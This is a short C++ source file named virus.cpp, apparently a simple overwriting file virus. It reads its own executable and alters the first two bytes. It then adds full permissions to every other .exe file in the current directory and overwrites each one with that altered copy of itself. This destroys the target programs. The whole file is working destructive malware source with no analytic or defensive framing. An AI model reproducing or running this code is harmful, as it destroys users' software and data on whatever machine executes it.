// virus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>

namespace fs = std::filesystem;

void changeExeFile(const fs::path exePath, std::string withText) {
	std::filebuf exeFile;
	exeFile.open(exePath, std::ios::binary | std::ios::out);
	if (!exeFile.is_open())
		std::cout << "cannot open" << std::endl;
	exeFile.sputn(withText.c_str(), withText.length());
	exeFile.close();
}

std::string getProgramText(const fs::path exeFilePath) {
	std::ifstream in(exeFilePath, std::ios_base::binary | std::ios_base::in);
	std::string str;
	char tmp;
    while (in.read(&tmp, sizeof(char))) {
        str += tmp;
    }
    in.close();

	std::ostringstream oss;
	oss << "IS" << str.substr(2);

	return oss.str();
}

int main(int argc, char** argv) {
	const fs::path currentDirPath = fs::current_path();
	const fs::path exeFilePath = std::string(argv[0]) + ".exe";
	const std::string textToWriteInExe = getProgramText(exeFilePath);

	for (const auto& entry : fs::directory_iterator(currentDirPath)) {
		if (entry.is_directory()) continue;
		const fs::path filePath = entry.path();
		if (filePath == exeFilePath) continue;
		if (filePath.extension() == ".exe") {
            fs::permissions(filePath,
                            fs::perms::all,
                            fs::perm_options::add);
			std::cout << "File: " << filePath << std::endl;
			changeExeFile(filePath, textToWriteInExe);
		}
	}

	system("pause");
}
